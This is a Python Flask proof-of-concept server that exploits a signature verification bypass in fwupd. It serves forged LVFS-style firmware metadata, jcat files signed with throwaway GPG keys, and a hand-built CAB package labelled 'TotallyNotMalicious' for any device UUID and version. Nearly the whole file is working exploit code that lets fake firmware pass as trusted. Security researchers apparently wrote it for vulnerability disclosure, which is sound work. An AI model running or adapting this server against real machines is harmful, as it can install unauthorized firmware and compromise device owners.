#!/usr/bin/env python3
from flask import Flask, Response, url_for
import sys
import os
import gpg
import tempfile
import gzip
import json
import hashlib
import requests
import base64
import struct
from shutil import rmtree
from functools import lru_cache
from lxml import etree
from lxml.builder import E

app = Flask(__name__)


"""
We use @lru_cache liberally throughout for two things:

1. To reach out to the real LVFS CDN a minimum number of times
2. To cache things like generation of compressed data which will be signed (re-compressing can break signatures)

This POC requires the installation of `python3-gpg` from your OS vendor. It
apparently doesn't like being installed via `pip` because it needs to match
your system's `libgpgme`.

apt install python3-flask python3-gpg python3-lxml
"""


def create_gpg_context_with_throwaway_signing_key(bits=1024):
    """
    creates a gpgme context with a fresh key set as the signer

    Returns the context and the filesystem directory that backs it
    """
    gpg_homedir = tempfile.mkdtemp()
    os.chmod(gpg_homedir, 0o700)

    c = gpg.Context(armor=True)
    c.home_dir = gpg_homedir

    res = c.create_key("Throwaway Key",
                       algorithm="rsa{}".format(bits),
                       sign=True,
                       certify=True,
                       expires=False)

    c.signers = list(c.keylist(pattern=res.fpr, secret=True))[:1]

    return c, gpg_homedir


def sign_data_with_throwaway_gpg_key(data):
    c, gpg_homedir = create_gpg_context_with_throwaway_signing_key()

    signed_data, res = c.sign(data, mode=gpg.constants.sig.mode.NORMAL)

    rmtree(gpg_homedir)

    return signed_data.decode()


def detached_sign_data_with_throwaway_gpg_key(data):
    c, gpg_homedir = create_gpg_context_with_throwaway_signing_key()

    signed_data, res = c.sign(data, mode=gpg.constants.sig.mode.DETACH)

    rmtree(gpg_homedir)

    return signed_data.decode()


@lru_cache(maxsize=None)
def generate_jcat_document(sha1sum, gpg_signature):
    jcat_message = {
        "JcatVersionMajor": 0,
        "JcatVersionMinor": 1,
        "Items": [
            {
                "Id": "firmware.xml.gz",
                "Blobs": [
                    {
                        "Kind": 4,
                        "Flags": 1,
                        "Timestamp": 1587399600,
                        "Data": sha1sum,
                    },
                    {
                        "Kind": 2,
                        "Flags": 1,
                        "Timestamp": 1587399600,
                        "Data": gpg_signature,
                    }
                ]
            }
        ]
    }

    jcat_message_compressed = gzip.compress(json.dumps(jcat_message).encode())

    return jcat_message_compressed


@lru_cache(maxsize=None)
def generate_xml_metadata():
    xml = ('<?xml version="1.0" encoding="ISO-8859-1"?>\n'
           '\t<poc>&fwupd_poc;</poc>\n').encode()

    return gzip.compress(xml)


@lru_cache(maxsize=None)
def get_lvfs_detached_signature():
    """
    gets the current detached GPG signature straight from LVFS. We cache it so we only need to fetch it once.
    """
    url = "https://cdn.fwupd.org/downloads/firmware.xml.gz.asc"
    ua_string = "fwupd/1.4.1"
    r = requests.get(url, headers={"User-Agent": ua_string})
    return r.text


@app.route("/detached_unknown_key/firmware.xml.gz")
@app.route("/detached_bad_signature/firmware.xml.gz")
@app.route("/bypass/firmware.xml.gz")
def serve_metadata():
    """Serves a compressed dummy XML document"""
    xml = generate_xml_metadata()
    return Response(xml, mimetype="application/gzip")


@app.route("/detached_unknown_key/firmware.xml.gz.asc")
def serve_detached_gpg_signature_unknown_key():
    """
    Serves a detached PGP signature, signed by a key unknown to fwupd
    """
    message = b"I am a meaningless message detach-signed by a throwaway key :)\n"

    signature = detached_sign_data_with_throwaway_gpg_key(message)

    return Response(signature, mimetype="text/plain")


@app.route("/detached_unknown_key/firmware.xml.gz.jcat")
def serve_jcat_signature_unknown_key():
    """
    Serves a jcat document with a detached PGP signature, signed by a key unknown to fwupd
    """

    xml = generate_xml_metadata()

    jcat_document = generate_jcat_document(
        sha1sum=hashlib.sha1(xml).hexdigest(),
        gpg_signature=detached_sign_data_with_throwaway_gpg_key(xml))

    return Response(jcat_document, mimetype="application/gzip")


@app.route("/detached_bad_signature/firmware.xml.gz.asc")
def serve_detached_gpg_signature_bad_sig():
    """
    Serves a detached PGP signature from LVFS that doesn't match our XML
    (i.e. should result in "bad signature")
    """
    signature = get_lvfs_detached_signature()

    return Response(signature, mimetype="text/plain")


@app.route("/detached_bad_signature/firmware.xml.gz.jcat")
def serve_jcat_signature_bad_sig():
    """
    Serves a jcat document with a detached PGP signature from LVFS that doesn't match our XML
    (i.e. should result in "bad signature")
    """

    xml = generate_xml_metadata()

    jcat_document = generate_jcat_document(
        sha1sum=hashlib.sha1(xml).hexdigest(),
        gpg_signature=get_lvfs_detached_signature())

    return Response(jcat_document, mimetype="application/gzip")


@app.route("/bypass/firmware.xml.gz.asc")
@app.route("/poc/uuid/<uuid>/version/<version>/updateprotocol/<update_proto>/firmware.xml.gz.asc")
def serve_bypass_gpg_signature(uuid=None, version=None, update_proto=None):
    """Serves a normal PGP signature that triggers the verification bypass"""
    message = (b"I am a message signed by a throwaway key.\n"
               b"I am NOT a detached signature\n")

    message_signed = sign_data_with_throwaway_gpg_key(message)

    return Response(message_signed, mimetype="text/plain")


@app.route("/bypass/firmware.xml.gz.jcat")
def serve_bypass_jcat_signature():
    """
    Serves a jcat document with a normal PGP signature that triggers the verification bypass
    """

    xml = generate_xml_metadata()

    jcat_document = generate_jcat_document(
        sha1sum=hashlib.sha1(xml).hexdigest(),
        gpg_signature=sign_data_with_throwaway_gpg_key(b"Hello, world!"))

    return Response(jcat_document, mimetype="application/gzip")


def generate_cab(uuid, version, update_proto):
    COMPONENT = E.component
    ID = E.id
    NAME = E.name
    SUMMARY = E.summary
    PROVIDES = E.provides
    FIRMWARE = E.firmware
    CUSTOM = E.custom
    VALUE = E.value
    RELEASES = E.releases
    RELEASE = E.release
    CHECKSUM = E.checksum
    DESCRIPTION = E.description
    P = E.p
    SIZE = E.size
    REQUIRES = E.requires

    metainfo_tree = COMPONENT(
            ID("com.hacker.firmware"),
            NAME("TotallyNotMalicious"),
            SUMMARY("This is fine"),
            PROVIDES(
                FIRMWARE(
                    uuid,
                    type="flashed",
                ),
            ),
            CUSTOM(
                VALUE(
                    update_proto,
                    key="LVFS::UpdateProtocol",
                ),
            ),
            RELEASES(
                RELEASE(
                    DESCRIPTION(
                        P("Totally not malicious ;)"),
                    ),
                    CHECKSUM(
                        filename="empty.dat", target="content",
                    ),
                    SIZE("1337", type="download"),
                    SIZE("0", type="installed"),
                    urgency="high", version=version, timestamp="1587399600", install_duration="120",
                ),
            ),
            REQUIRES(),
            type="firmware",
        )

    metainfo = etree.tostring(metainfo_tree, pretty_print=True, xml_declaration=True, encoding="UTF-8")

    # borrowed from <https://github.com/hughsie/python-cabarchive/blob/master/cabarchive/archive.py>
    def _chunkify(arr, size):
        """ Split up a bytestream into chunks """
        arrs = []
        for i in range(0, len(arr), size):
            chunk = bytearray(arr[i:i + size])
            arrs.append(chunk)
        return arrs

    # borrowed from <https://github.com/hughsie/python-cabarchive/blob/master/cabarchive/archive.py>
    def _checksum_compute(content, seed=0):
        """ Compute the MS cabinet checksum """
        csum = seed
        chunks = _chunkify(content, 4)
        for chunk in chunks:
            if len(chunk) == 4:
                ul = chunk[0]
                ul |= chunk[1] << 8
                ul |= chunk[2] << 16
                ul |= chunk[3] << 24
            else:
                # WTF: I can only assume this is a typo from the original
                # author of the cabinet file specification
                if len(chunk) == 3:
                    ul = (chunk[0] << 16) | (chunk[1] << 8) | chunk[2]
                elif len(chunk) == 2:
                    ul = (chunk[0] << 8) | chunk[1]
                elif len(chunk) == 1:
                    ul = chunk[0]
            csum ^= ul
        return csum

    # *screams internally*
    # This just barely works to dynamically construct a cab file that is acceptable to fwupd
    cab = [
        B"MSCF",
        struct.pack("<I", 0),
        struct.pack("<I", 0x6e + len(metainfo)),
        base64.b64decode("AAAAACwAAAAAAAAAAwEBAAIAAADSBAAAZwAAAAEAAAA="),
        struct.pack("<I", len(metainfo)),
        base64.b64decode("AAAAAAAAslCioyAAYmFkLm1ldGFpbmZvLnhtbAAAAAAABQAAAAAAslCEgyAAZW1w"
                         "dHkuZGF0AA=="),
        struct.pack("<I", _checksum_compute(
            struct.pack("<H", len(metainfo)) * 2 + metainfo
        )),
        struct.pack("<H", len(metainfo)),
        struct.pack("<H", len(metainfo)),
        metainfo
    ]

    cab = "".join(x.decode("latin-1") for x in cab).encode("latin-1")

    return cab


@app.route("/poc/uuid/<uuid>/version/<version>/updateprotocol/<update_proto>/poc.cab")
def serve_cab(uuid, version, update_proto):
    return Response(generate_cab(uuid, version, update_proto), mimetype="application/cab")


@lru_cache(maxsize=None)
def generate_custom_metadata(uuid, version, update_proto):
    """Generates meaningful metadata for use in the end-to-end POC"""
    COMPONENTS = E.components
    COMPONENT = E.component
    ID = E.id
    NAME = E.name
    SUMMARY = E.summary
    PROVIDES = E.provides
    FIRMWARE = E.firmware
    CUSTOM = E.custom
    VALUE = E.value
    RELEASES = E.releases
    RELEASE = E.release
    LOCATION = E.location
    CHECKSUM = E.checksum
    DESCRIPTION = E.description
    P = E.p
    SIZE = E.size
    REQUIRES = E.requires

    metadata_tree = COMPONENTS(
        COMPONENT(
            ID("com.hacker.firmware"),
            NAME("TotallyNotMalicious"),
            SUMMARY("This is fine"),
            PROVIDES(
                FIRMWARE(
                    uuid,
                    type="flashed",
                ),
            ),
            CUSTOM(
                VALUE(
                    update_proto,
                    key="LVFS::UpdateProtocol",
                ),
            ),
            RELEASES(
                RELEASE(
                    LOCATION(
                        url_for("serve_cab", _external=True, uuid=uuid, version=version, update_proto=update_proto)
                    ),
                    DESCRIPTION(
                        P("Totally not malicious ;)"),
                    ),
                    CHECKSUM(
                        hashlib.sha1(generate_cab(uuid=uuid, version=version, update_proto=update_proto)).hexdigest(),
                        type="sha1", filename="poc.cab", target="container",
                    ),
                    SIZE("1337", type="download"),
                    SIZE("0", type="installed"),
                    urgency="high", version=version, timestamp="1587399600", install_duration="120",
                ),
            ),
            REQUIRES(),
            type="firmware",
        ),
        origin="lvfs", version="0.9",
    )

    metadata = etree.tostring(metadata_tree, pretty_print=True, xml_declaration=True, encoding="UTF-8")

    return gzip.compress(metadata)


@app.route("/poc/uuid/<uuid>/version/<version>/updateprotocol/<update_proto>/firmware.xml.gz")
def serve_custom_metadata(uuid, version, update_proto):
    metadata = generate_custom_metadata(uuid, version, update_proto)
    return Response(metadata, mimetype="application/gzip")


@app.route("/poc/uuid/<uuid>/version/<version>/updateprotocol/<update_proto>/firmware.xml.gz.jcat")
def serve_poc_jcat_signature(uuid, version, update_proto):
    xml = generate_custom_metadata(uuid, version, update_proto)

    jcat_document = generate_jcat_document(
        sha1sum=hashlib.sha1(xml).hexdigest(),
        gpg_signature=sign_data_with_throwaway_gpg_key(b"Hello, world!"))

    return Response(jcat_document, mimetype="application/gzip")


if __name__ == "__main__":
    try:
        host = sys.argv[1]
        port = int(sys.argv[2])
    except IndexError:
        print("Usage: {} <host> <port>".format(sys.argv[0]))
        sys.exit(1)

    app.run(host=host, port=port, debug=False)
